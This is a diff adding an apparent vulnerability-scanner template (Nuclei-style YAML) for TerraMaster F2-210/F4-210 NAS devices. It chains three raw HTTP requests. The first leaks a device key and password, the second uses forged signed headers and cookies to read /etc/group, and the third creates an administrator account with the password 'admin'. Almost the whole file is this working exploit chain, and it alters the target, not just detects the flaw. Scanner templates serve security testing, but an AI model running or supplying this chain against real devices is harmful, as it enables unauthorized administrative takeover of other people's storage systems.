@@ -1,0 +1,99 @@
+id: terramaster-f4-210-arbitrary-user-add
+info:
+  name: Terramaster F4-210 Arbitrary User Add Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    TerraMaster F2-210 and F4-210 have arbitrary user addition vulnerabilities. Attackers can add an administrator account and obtain server permissions by leaking sensitive information and forging sessions.
+  reference:
+    - https://packetstormsecurity.com/files/165399/terramaster-exec.py.txt
+  tags: permission-bypass
+
+variables:
+  timestamp: '{{unix_time()}}'
+
+http:
+  - raw:
+      - |
+        POST /module/api.php?mobile/wapNasIPS HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: TNAS
+        User-Device: TNAS
+
+    extractors:
+      - type: regex
+        name: key
+        part: body
+        internal: true
+        regex:
+          - '"ADDR":"(.*?)",'
+        group: 1
+      - type: regex
+        name: pwd
+        part: body
+        internal: true
+        regex:
+          - '"PWD":"(.*?)",'
+        group: 1
+
+    matchers:
+      - type: word
+        words:
+          - "PWD"
+          - "ADDR"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /module/api.php?mobile/fileDownload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: TNAS
+        User-Device: TNAS
+        Signature: {{hex_encode(md5(concat(key, timestamp)))}}
+        Timestamp: {{timestamp}}
+        Authorization: {{pwd}}
+        Cookie: kod_name=guest; kod_token={{hex_encode(md5(key))}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=%2Fetc%2Fgroup
+
+    extractors:
+      - type: regex
+        name: users
+        part: body
+        internal: true
+        regex:
+          - 'admin:x:3:(.*?)\n'
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /module/api.php?mobile/set_user_information HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: TNAS
+        User-Device: TNAS
+        Signature: {{hex_encode(md5(concat(key, timestamp)))}}
+        Timestamp: {{timestamp}}
+        Authorization: {{pwd}}
+        Cookie: kod_name={{users}}; kod_token={{hex_encode(md5(concat(key, pwd)))}}; PHPSESSID={{extract_cookie}}
+        Content-Type: application/x-www-form-urlencoded
+
+        groups=%5B%22allusers%22%2C+%22admin%22%5D&username=admin&operation=0&password=admin&capacity=
+
+    matchers:
+      - type: word
+        words:
+          - "user exist"
+          - "create user successful"
+        part: body
+      - type: status
+        status:
+          - 200
